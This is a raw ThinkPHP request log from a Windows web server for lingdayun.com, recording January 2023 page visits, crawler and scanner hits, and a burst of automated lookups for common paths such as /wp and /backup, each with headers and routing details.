  'host' => 'www.lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/index_html' => '',
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T10:23:18+08:00 ] 10.0.8.4 116.179.32.252 GET /
[ log ] www.lingdayun.com/ [运行时间：0.094820s][吞吐率：10.55req/s] [内存消耗：1,276.21kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.lingdayun.com',
  'accept-language' => 'en-US,*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T11:30:45+08:00 ] 10.0.8.4 175.24.212.154 GET /
[ log ] lingdayun.com/ [运行时间：0.073358s][吞吐率：13.63req/s] [内存消耗：1,275.80kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-httpx/0.23.0',
  'connection' => 'close',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T13:17:57+08:00 ] 10.0.8.4 82.157.58.131 GET /
[ log ] lingdayun.com/ [运行时间：0.073255s][吞吐率：13.65req/s] [内存消耗：1,276.26kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T13:18:26+08:00 ] 10.0.8.4 82.157.58.131 GET /
[ log ] lingdayun.com/ [运行时间：0.083426s][吞吐率：11.99req/s] [内存消耗：1,276.26kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T13:32:31+08:00 ] 10.0.8.4 93.158.90.137 GET /humans.txt
[ log ] lingdayun.com/humans.txt [运行时间：0.065192s][吞吐率：15.34req/s] [内存消耗：1,113.26kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'humans.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'http://lingdayun.com/humans.txt',
  'cache-control' => 'no-cache',
  'accept-language' => 'en-US',
  'accept' => 'text/plain',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.5.00.17656 Chrome/85.0.4183.121 Electron/10.4.7 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/humans_txt' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T13:32:35+08:00 ] 10.0.8.4 93.158.90.136 GET /ads.txt
[ log ] lingdayun.com/ads.txt [运行时间：0.078633s][吞吐率：12.72req/s] [内存消耗：1,113.25kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ads.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'http://lingdayun.com/ads.txt',
  'cache-control' => 'no-cache',
  'accept-language' => 'en-US',
  'accept' => 'text/plain',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.5.00.17656 Chrome/85.0.4183.121 Electron/10.4.7 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/ads_txt' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T13:32:37+08:00 ] 10.0.8.4 93.158.90.136 GET /
[ log ] lingdayun.com/ [运行时间：0.077462s][吞吐率：12.91req/s] [内存消耗：1,276.52kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'http://lingdayun.com/',
  'cache-control' => 'no-cache',
  'accept-language' => 'en-US',
  'accept' => 'text/html,application/xhtml+xml',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.5.00.17656 Chrome/85.0.4183.121 Electron/10.4.7 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T13:37:08+08:00 ] 10.0.8.4 220.196.160.96 GET /
[ log ] lingdayun.com/ [运行时间：0.075236s][吞吐率：13.29req/s] [内存消耗：1,277.13kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Teams/1.5.00.17656 Chrome/85.0.4183.121 Electron/10.4.7 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T13:37:43+08:00 ] 10.0.8.4 198.235.24.3 GET /
[ log ] lingdayun.com/ [运行时间：0.072589s][吞吐率：13.78req/s] [内存消耗：1,276.03kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:12+08:00 ] 10.0.8.4 89.117.20.171 HEAD /wordpress
[ log ] lingdayun.com/wordpress [运行时间：0.068991s][吞吐率：14.49req/s] [内存消耗：1,112.25kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wordpress',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/wordpress',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/wordpress' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:13+08:00 ] 10.0.8.4 89.117.20.171 HEAD /
[ log ] lingdayun.com/ [运行时间：0.094260s][吞吐率：10.61req/s] [内存消耗：1,275.74kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:14+08:00 ] 10.0.8.4 89.117.20.171 HEAD /wp
[ log ] lingdayun.com/wp [运行时间：0.062368s][吞吐率：16.03req/s] [内存消耗：1,112.12kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/wp',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/wp' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:14+08:00 ] 10.0.8.4 89.117.20.171 HEAD /bc
[ log ] lingdayun.com/bc [运行时间：0.060938s][吞吐率：16.41req/s] [内存消耗：1,112.12kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'bc',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/bc',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/bc' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:15+08:00 ] 10.0.8.4 89.117.20.171 HEAD /bk
[ log ] lingdayun.com/bk [运行时间：0.062511s][吞吐率：16.00req/s] [内存消耗：1,112.12kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'bk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/bk',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/bk' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:16+08:00 ] 10.0.8.4 89.117.20.171 HEAD /backup
[ log ] lingdayun.com/backup [运行时间：0.068496s][吞吐率：14.60req/s] [内存消耗：1,112.11kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'backup',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/backup',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/backup' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:17+08:00 ] 10.0.8.4 89.117.20.171 HEAD /old
[ log ] lingdayun.com/old [运行时间：0.072001s][吞吐率：13.89req/s] [内存消耗：1,112.13kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'old',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/old',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/old' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:18+08:00 ] 10.0.8.4 89.117.20.171 HEAD /new
[ log ] lingdayun.com/new [运行时间：0.072420s][吞吐率：13.81req/s] [内存消耗：1,112.13kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'new',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/new',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/new' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:18+08:00 ] 10.0.8.4 89.117.20.171 HEAD /main
[ log ] lingdayun.com/main [运行时间：0.064587s][吞吐率：15.48req/s] [内存消耗：1,112.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'main',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/main',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/main' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T14:59:19+08:00 ] 10.0.8.4 89.117.20.171 HEAD /home
[ log ] lingdayun.com/home [运行时间：0.074683s][吞吐率：13.39req/s] [内存消耗：1,112.15kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'referer' => 'http://lingdayun.com/home',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
)
[ info ] [ PARAM ] array (
  '/home' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:01:14+08:00 ] 10.0.8.4 180.101.244.13 GET /wp
[ log ] lingdayun.com/wp [运行时间：0.073859s][吞吐率：13.54req/s] [内存消耗：1,113.94kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/wp',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/wp' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:02:33+08:00 ] 10.0.8.4 220.196.160.144 GET /wordpress
[ log ] lingdayun.com/wordpress [运行时间：0.071328s][吞吐率：14.02req/s] [内存消耗：1,113.98kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wordpress',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/wordpress',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/wordpress' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:06:47+08:00 ] 10.0.8.4 220.196.160.154 GET /new
[ log ] lingdayun.com/new [运行时间：0.067250s][吞吐率：14.87req/s] [内存消耗：1,113.92kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'new',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/new',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/new' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:07:18+08:00 ] 10.0.8.4 59.83.208.103 GET /old
[ log ] lingdayun.com/old [运行时间：0.068673s][吞吐率：14.56req/s] [内存消耗：1,113.92kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'old',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/old',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/old' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:08:37+08:00 ] 10.0.8.4 220.196.160.154 GET /bc
[ log ] lingdayun.com/bc [运行时间：0.073292s][吞吐率：13.64req/s] [内存消耗：1,113.94kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'bc',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/bc',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/bc' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:08:43+08:00 ] 10.0.8.4 180.101.244.15 GET /backup
[ log ] lingdayun.com/backup [运行时间：0.070364s][吞吐率：14.21req/s] [内存消耗：1,113.94kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'backup',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/backup',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/backup' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:10:16+08:00 ] 10.0.8.4 180.101.244.11 GET /home
[ log ] lingdayun.com/home [运行时间：0.091920s][吞吐率：10.88req/s] [内存消耗：1,113.93kb] [文件加载：40]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for' => '82.157.249.182',
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://lingdayun.com/home',
  'connection' => 'close',
  'cache-control' => 'max-age=0',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
  'host' => 'lingdayun.com',
)
[ info ] [ PARAM ] array (
  '/home' => '',
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2023-01-06T15:20:56+08:00 ] 10.0.8.4 106.55.251.49 GET /
[ log ] lingdayun.com/ [运行时间：0.088021s][吞吐率：11.36req/s] [内存消耗：1,276.14kb] [文件加载：44]
[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => 'lingdayun.com',
  'accept-encoding' => 'gzip',
  'user-agent' => 'mozilla/5.0 (iphone; cpu iphone os 13_5_1 like mac os x) applewebkit/605.1.15 (khtml, like gecko) mobile/15e148 micromessenger/7.0.15(0x17000f2b) nettype/4g language/zh_cn miniprogram',
  'referer' => 'http://lingdayun.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
